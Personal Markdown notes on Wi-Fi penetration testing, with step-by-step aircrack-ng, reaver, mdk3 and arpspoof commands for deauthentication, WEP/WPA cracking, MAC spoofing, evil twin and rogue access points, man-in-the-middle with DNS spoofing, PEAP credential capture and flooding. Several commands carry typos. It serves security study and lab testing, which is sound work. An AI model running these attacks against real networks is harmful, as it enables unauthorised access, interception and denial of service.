
# wifi

```
ifconfig wlan0 up
arp -a
iwlist wlan0 scanning
airmon-ng
airmon-ng start wlan0 # creates monitor interface wla0mon
```

Use wireshark on the wlan0mon interface

Also use tshark.

## All management frames

```
wlan.fc.type == 0

```

## control frames

```
wlan.fc.type == 1
```

## data frames

```
wlan.fc.type == 2
```

## subtype

```
(wlan.fc.type == 0) && (wlan.fc.subtype == 8)
```

## apply filter

right click on a packet and select "apply filter"

## Packet sniffing

```
airmon-ng --bssid <mac> wlan0mon
```

## Lock onto the AP channel

```
iwconfig wlan0mon channel 11
iwconfig wlan0mon
```

Using wireshark sniff on wlan0mon interface and apply a filter

```
(wlan.bssid == <mac>) && (wlan.fc.type_subtype == 0x20)
```

## Packet injection

Injecting packets without being connected to the unencrypted access point.

```
aireplay-ng
```
# in wireshark filter: (wlanbssid == <mac>) && !(wlan.fc.type_subtype == 0x08)

```
aireplay-ng -9 -e Wireless Lab -a <mac> wlan0mon
```

## Uncovering hidden SSIDs

use wireshark to look for probe requests. Passively monitoring for probe requests will
reveal the SSID of the hidden SSID.

Alternatively you can attempt to deauth existing clients to reveal the SSID.

```
aireplay -O 5 -a <mac> --ignore-negative wlan0mon
```

Where -O means death and the value is the number of deauth packets to send.

This will force legitimate clients to disconect and re-connect. You
 can filter deauth packets using the filter:

```
wlan.fc.type_subtype == 0x0c
```

Once you have bssid of the hidden AP

```
(wlan.bssid == <AP_mac> && !(wlan.fc.type_subtype == 0x08)
```

To view all non=beacon packets to and fro from the access point.

## Bypassing MAC filters

View connected clients.

```
airodump-ng -c 11 -a --bssid=<mac> wlan0mon
```

Once you have a whitelisted MAC use machanger to spoof it.

```
ifconfig wlan0mon down
macchanger -m 00:00:00:00:00:00 wlan0mon
ifconfig wlan0mon up
```

## WEP - Bypassing shared authentication

```
airodump-ng wlan0mon -c 11 --bssid <mac> -w keystream
```

AUTH columns reads WEP if capture succeeds.

## WLAN Encryption

* Wired equivalent privacy (WEP)
* Wi-fi protected access (WPA)
* Wi-Fi protected access v2 (WPA2)

## WEP encryption

One fundamental weakness WEP is its use of RC4 and short IV value that is recycled
 every 224 frames. There is a 50 percent chance of four IV resuses every 5000 packets.

```
airodump-ng wlan0mon
```

# save a pcap
```
airodump-ng --bssid EE:EE:EE:EE:EE:EE --channel 10 --write wepdemo wlan0mon
```
You may need to generate wep traffic in order to get enough packets to decrypt it.

```
aireplay -3 -b xx:xx:xx:xx:xx:xx -h xx:xx:xx:xx:xx:xx wlan0mon --ignore-negative-one
```

This command will replay packets in the spoofed network.

## cracking wep

aircrack-ng wlan0mon.cap

## WPA/WPA2

* WPA (or WPA v1) primarily uses the Temporal Key Integrity Protocol (TKIP) encryption algorithm.
* WPA2 in contrast uses AES-CCMP algorithm for encryption which is more robust than TKIP

Both WPA and WPA2 allow either EAP-based authentication using Radius servers (enterprise) or
 a Pre-Shared Key (PSK) (personal)-based authentication schema.

## Dictionary attacks on WPA & WPA2-PSK

WPA/WPA2 PSK works by deriving a per-session key, called the Pairwise Transient key (PTK),
using the PSK and fiver other parameters -- SSID of the network, Authenticator Nonce (ANonce),
Supplicatant Noce (SNonce), Authenticator MAC address and access point MAC.

This key is used to encrypt all data between the client and access point. If the entire
 handshake is intercepted all parameters can be obtained except for the PSK. This can
 be brute forced offline using a dictionary attack. You must have the PSK in the
 dictionary for it to work.

The PSK is derived using a password based key deriviation function (PBKDF2) which
 outputs a 256-bit shared key. Using a tool the 256-bit PSK from each passphrase
 this is used to verify the Message Integrity Check (MIC) of one of the captured
 handshake. 

## Cracking a weak password

```
airodump-ng --bssid 00:00... --channel 11 --write demo wlan0mon
```

* deauth existing clients to capture handshake

```
aireplay-ng --deauth 1 -a xx:xx.. wlan0mon --ignore-negative-one
```

* airodump will indicate "WPA handshake" when detected or a fixed channel message
* stop airodump
* aircrack-ng demo.cap -w /usr/share/wordlists/nmap.list


## pre-calculating PMKs
```
genpmk -f <wordlist> -d PMK-output -s "<wireless_lab>"
cowpatty -d PMK-lab -s "<wireless_lab>" -r demo.cap
```
## decrypting WEP or WPA packets

```
airdecap-ng -w <cracked_password> wep_crack_demo.cap
tshark -r wep_crack_demo.cap
```
## connecting to a WEP network

```
iwconfig wlan0 essid "wireless_lab" key password
iwconfig wlan0
```

## connecting to WPA using wpa_supplicant

create a file wpa-supp.conf

```
#WPA-PSK/TKIP

network={
        ssid="wireless_lab"
        key_mgmt=WPA-PSK
        proto=WPA
        pairwise=TKIP
        group=TKIP
        psk="password123"
}

```

* wpa_supplicant -D wext -i wlan0 -c wpa-supp.conf
* dhcient3 wlan0 -- connect via dhcp

## test for default credentials on access point

* hydra tool or other brute forcing tool

## denial of service attacks

* deauthentication
* disassociation attacks
* CTS-RTS attacks
* signal inference or spectral jamming attacks

## evil twin and access point MAC spoofing

* locate the access point BSSID and ESSId with airodump-ng

```

airodump-ng -c 11 wlan0mon
airbase-ng --essid Rogue -c 8 wlan0mon
aireplay-ng -O 5 -a xx:xx... --ignore-negative-one wlan0mon
```

## rogue access point

Creating an access point that bridges traffic to the original one. Commonly uses no encryption.

```
airbase-ng --essid Rogue -c 8 wlan0mon

apt-get install bridge-utils

brctl addbr Wifi-Bridge

brctl addif Wifi-Bridge eth0
brctl addif Wifi-Bridge at0

ifconfig eth0 0.0.0.0 up
ifconfig at0 0.0.0.0 up

echo 1 > /proc/sys/net/ipv4/ip_forward

ifconfig Wifi-Bridge up

```

## honeypot attack

Monitor probes for Preferred network list (PNL). Create a fake AP with the same ESSID to
 capture traffic and attempt to force the client to connect to it.

```
airodump-ng wlan0mon

```

wireshark filter for probe requests

```
(wlan.addr=<your_mac> && wlan.fc.subtype=0x04)
```

Create a fake access point

```
airbase-ng -a xx:xx... --essid "wireless lab" -c 8 wlan0mon
```

deauth legitimate clients

```
aireplay-ng -O 5 -a xx:xx... --ignore-negative-one wlan0mon
```

## cafe latte attack

obtaining the wep key using only the client

```
airodump-ng wlan0mon

airbase-ng -a xx:xx... --essid "wireless lab" -L -W 1 -c 7 wlan0mon

airodump-ng wlan0mon -c7 --essid 'wireless lab' -w keystream

```

## hirte attack

same result as caffe latte

```
airbase-ng -a xx:xx --essid 'wireless lab' -N -W 1 -c 9 wlan0mon
airodumo-ng wlan0mon -c 9 --essid 'wireless lab' -w Hirte
```

## ap-less WPA cracking

```
airbase-ng -a xx:xx... --essid 'wireless lab' -N -W 1 -c 3 wlan0mon
airodump -c 3 --bssid cc:cc --write ap-less-cracking wlan0mon
```

## MITM

```
airbase-ng --essid mitm -c 11 wlan0mon

```

creates a tap interface at0

```
ifconfig at0
brctl addbr mitm-bridge
brctl addif mitm-bridge eth0
brctl addif mitm-bridge at0
ifconfig eth0 0.0.0.0 up
ifconfig at0 0.0.0.0 up

```

assign IP address to the bridge interaface

```
ifconfig mitm-bridge 192.168.0.199 up
```

then ping the gateway to ensure that we are connected to rest of the network

```
echo 1 > /proc/sys/net/ipv4/ip_foward
```

connect a wireless client and ping the gateway to ensure connectivity


## DNS spoofing sessions

wireshark filter

```
dns
```

using dnsspoof

```
dnsspoof -i mitm-bridge
```

will foward to a server running on port 80... 

```
apache2ctl start
```

will direct all request to the apache test page on port 80

## wifishing

create four virtual interfaces using all AP encryption types

```
iw wlan0 interface add wlan0mon type monitor
iw wlan0 interface add wlan0mon1 type monitor
iw wlan0 interface add wlan0mon2 type monitor
iw wlan0 interace add walan0mon3 type monitor
```

```
airbase-ng --essid "wireless lab" -a cc:cc... -c 3 wlan0mon
airbase-ng --essid "wireless lab" -a cc:cc... -W 1 wlan0mon1
airbase-ng --essid "wireless lab" -a cc:cc... -N -W 1 -Z 1 -c 3 wlan0mon2
airbase-ng --essid "wireless lab" -a cc:cc... -N -W 1 -Z 2 -c 3 wlan0mon3
```

## KRACK (key re-installation attacks)

discovered in 2017

The pairwise transient key (PTK) used for encryption is made up of five attributes

* shared secret known as the pairwise master key (PMK)
* a nonce value created by the access point (ANonce)
* a nonce value created by the user station (SNonce)
* the access point MAC (APMAC)
* the user station MAC (STAMAC)

Throughout the handshake message indentification codes (MIC) are used to provide
 integrity and security.

1. stage 1: the access point transmits the ANonce value to the user station
the user station creates the PTK and holds the key it will use for encryption.
2. stage 2: the user station sends back its own nonce. The access point creats the PTK
3. stage 3: the access point creates and sends the group temporal key (GTK).
4. stage 4: user returns an acknowledged statement

```
git clone https://github.com/vanhoefm/krackattacks-scripts
apt-get install libnl-3-dev libnl-genl-3-dev pkg-config libssl-dev
net-tools git sysfsutils python-scapy python-pycryptodome
cd hostapd
cp defconfig .config
make -j 2
cd /krackattacks
nano ./hostapd.conf
systemctl stop NetworkManager.service
systemctl disable NetworkManager.service
python krack-test-client.py
```

## Enterprise RADIUS

```
sudo apt-get install freeradius-wpe
cd /etc/freeradius-wpe/3.0
```

open /mods-available/eap
change default_eap_type = peap
open clients.cong
change password

```
freeradius-wpe -s -X
```

## attacking PEAP

Protected Extensible Authentication Protocol (PEAP)

restart the server
```
freeradius-wpe -s -X
```
monitor the log file

```
tail -f /var/log/freeradius-wpe/radius.log
```

## WLAN Penetration testing methodology

* Planning phase
* Discovery phase
* Attack phase
* Reporting phase

## planning phase

* scope of the assessment
* effort estimation
* legality

## discovery

* enumerate visible and hidden wireless networks
* enumerate devices in the area & those connected to the target
* map the range of the networks: are they reachable from nearby cafe's where attackers could sit?

Some useful statements that would be useful to a client

* number of devices associations with open networks and corporate networks
* number of devices that have networks that linked to locations using solutions like WiGLE
* the existence of weak encryption
* the networks are too restrictive and block standard users

## attack

* cracking the encryption
* attacking the infrastucture
* compromising clients
* finding vulnerable clients
* finding unauthorized clients

## attacking infrastructure

If network access is gained perform a standard networking penetration test (if allowed in scope).

* port scan
* identify services
* enumerate open services  especially unauthenticated ones
* try to exploit vulnerable services

## compromising clients

after enumerating all wireless systems attempt KARMA and honeypot attacks

## Reporting

Finally at the end of testing you can report the findings to the client. The report must
 match the quality of the testing.

1. Management summary
2. Technical summary
3. Findings
        vulnerability description
        severity
        affected devices
        vulnerability type
        remediation
4. Appendices
,.extra info, poc, stolen data.

## WPS cracking

```
airmon-ng start wlan0
wash -i wlan0mon
reaver -i wlan0mon -b <mac> -vv
reaver -i wlan0mon -b <mac> -vv -p <PASSCODE>
```

## Probe requests

```
airmon-nng start wlan0
tshark -n -i wlan0mon subtype probereq
tshark -n -i wlan0mon -T fields -e wlan.sa -e wlan.ssid


## access control attacks

* war driving
* rogue access points
* MAC spoofing
* ad hoc associations
* AP misconfigurations
* client misassociation
* unauthorized association
* promiscuous client

## wardriving

```
kismet
```

Improve location accuracy using a USB GPS device

```
apt-get install gpsd
apt-get install gpsd-clients
lsusb
ls /dev/gps*
apt-get install giskimet
giskismet ­-x Kismet-DATE.netxml ­-q "select * 
    from  wireless" ­-o wardrive.kml
```

## sniffing tools

* Dsniff
* Tcpdump
* EtherApe
* Wireshark
* Kismet
* arpspoof

## arpreplay

Once target shows up in aireplay

```
aireplay-ng --arpreplay -b <target BSSID> -h <MAC of connected client> <interface>
aireplay-ng -2 -r ./replay_.cap ath0
```

## turn up signal power

```
iwconfig wlan0 txpower 27
```

## attacking availability

* dissassociation flood
* detecting beacon frames
* spoofing beacon frames
* executing a beacon flood
* executing a deauthentication flood
* ARP cache poisening
* performing a denial of service
* hiding a wireless network

## beacon frame flood

```
mdk3 wlan0mon b -n "impa" -b 54 -w a -m -c 11
```

## arp cache poisening

```
arpspoof -i eth0 -t target-ip target-gateway-ip
```

